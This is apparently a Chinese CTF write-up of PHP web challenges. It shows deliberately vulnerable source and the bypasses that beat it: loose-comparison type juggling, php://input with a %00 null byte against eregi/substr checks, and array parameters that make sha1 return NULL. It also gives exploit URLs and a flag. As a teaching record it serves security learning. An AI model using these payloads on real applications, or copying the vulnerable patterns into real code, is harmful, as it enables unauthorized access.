strrev() 反转字符串。
hex2bin() 把十六进制值的字符串转换为 ASCII 字符。

<?phperror_reporting(0);require __DIR__.'/lib.php';if(isset($_GET['time'])){    if(!is_numeric($_GET['time'])){        echo 'The time must be number.';    }else if($_GET['time'] < 60 * 60 * 24 * 30 * 2){        echo 'This time is too short.';    }else if($_GET['time'] > 60 * 60 * 24 * 30 * 3){        echo 'This time is too long.';    }else{        sleep((int)$_GET['time']);        echo $flag;    }    echo '<hr>';}highlight_file(__FILE__);

通过get接受变量time通过is_numeric函数检测是否为数字或数字字符串不是就结束判断并输出文字,并且不能小于5184000和大于7776000,但是输出前还有个sleep函数会延时你输入的数值,这样等到2099年都拿不到flag


这里采用的思路是弱比较

1、==和===

==为弱相等，也就是说12=="12" --> true，而且12=="12cdf" --> true，只取字符串中开头的整数部分，但是1e3dgf这样的字符串在比较时，取的是符合科学计数法的部分：1e3，也就是1000类型就是int而不是sting

<?phpvar_dump(1e3);//输出 float(1000) 并不是string?>

challenge 3

访问页面只显示work harder!harder!harder!眉头一皱不对劲,查看源码。

<!--challenge3.txt-->work harder!harder!harder!

这边提示了个challenge3.txt访问得到源码

<?phperror_reporting(0);echo "<!--challenge3.txt-->";require __DIR__.'/lib.php';if(!$_GET['id']){    header('Location: challenge3.php?id=1');    exit();}$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.')){    echo 'Hahahahahaha';    return ;}$data = @file_get_contents($a,'r');if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4){    echo $flag;}else{    print "work harder!harder!harder!";}?>

在说源码前先说几个函数

stripos: 查找字符串在另一字符串中第一次出现的位置(不区分大小写)函数返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。字符串位置从 0 开始，不是从 1 开始。file_get_contents: 读取文件到字符串中加上@是不显示错误信息strlen：获取字符串长度eregi: 搜索一个字符串内的指定字符(不区分大小写)substr: 截取字符串

说一下源码,从GET接受3个变量id，a，b,其中id不为空,a呢不能含有.然后会经过file_get_contents函数,b被拿到if进行判断,想要获取flag要满足以下条件$data==1112 is a nice lab!,$data是由$a经过file_get_contents返回的值,$id==0传入一个字符比较时会被类型转换为0,$b长度要大于5且第一个字符与'111'拼接,要等于'1114'且首字母不为4


解题

 http://URL/challenge3.php?id=x&a=php://input&b=%00111111

id=x 满足$id==0

a=php://inpu   使$data可以通过php://input来接受post数据

b=%00111111 substr()会发生截断，在匹配时进行eregi('111','1114')满足，同时%00不会对strlen()造成影响。

然后post 1112 is a nice lab!

得到 flag: flag{dsayandahckasda}

<?phpif (isset($_GET['name']) and isset($_GET['password'])) {    if ($_GET['name'] == $_GET['password'])        echo '<p>Your password can not be your name!</p>';    else if (sha1($_GET['name']) === sha1($_GET['password']))      die('Flag: '.$flag);    else        echo '<p>Invalid password.</p>';}else{  echo '<p>Login first!</p>';?>

首先通过Get接受 name和password,要获取flag两个值不能为空,两个值不能相等,且经过sha1函数加密后结果要相等


解题

http://url/challenge5.php?name[]=1&password[]=2

其中sha1不能处理数组，当传入name[]=1&password[]=2时，会造成sha1(Array)=sha1(Array)，即NULL===NULL，从而获取flag。
